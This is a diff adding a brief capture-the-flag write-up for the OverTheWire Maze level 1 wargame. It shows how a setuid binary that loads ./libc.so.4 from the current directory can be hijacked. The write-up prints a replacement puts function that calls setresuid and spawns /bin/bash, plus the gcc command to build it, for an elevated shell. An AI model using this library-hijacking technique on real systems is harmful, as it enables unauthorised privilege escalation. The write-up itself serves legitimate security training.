@@ -1,0 +1,31 @@
+Simple level!
+
+Executing maze1 it complains that the libc it wants doesn't exist! (./libc.so.4)
+
+Copying a legitimate libc into the directory we run maze1 from, it outputs 'Hello, world!'.
+
+Similar to how we could function-hook puts in utumno level 0, we can also do something similar here...
+
+the difference is utumno0 was function hooking because we had to use LD_PRELOAD... this allows us to alter what a function does, BUT
+it also doesn't allow one to elevate their privileges -- LD_PRELOAD disables the setuid bit.
+
+Fortunately that difference is what allows us to exploit this level, we don't have to use LD_PRELOAD because it uses the library we
+create without us needing to dynamically link it in with LD_PRELOAD. This means we can elevate our privileges in our 'new' puts function
+to that of maze2, and execute whatever we want! (like reading maze2pass, or executing /bin/sh as maze2).
+
+		'new' libc.so.4.c
+┌───────────────────────────────────────────────────┐
+│#include <stdio.h>                                 │
+│#include <unistd.h>                                │
+│#include <stdlib.h>                                │
+│                                                   │
+│int puts(const char *str){                         │
+│	setresuid(geteuid(), geteuid(), geteuid()); │
+│	system("/bin/bash");                        │
+│	return 1;                                   │
+│}                                                  │
+└───────────────────────────────────────────────────┘ 
+                           | 
+Compiling this ^ with this v  nets us an elevated shell as maze2!
+               |
+gcc -m32 libc.so.4.c -o libc.so.4 -fPIC -shared -ldl -D_GNU_SOURCE
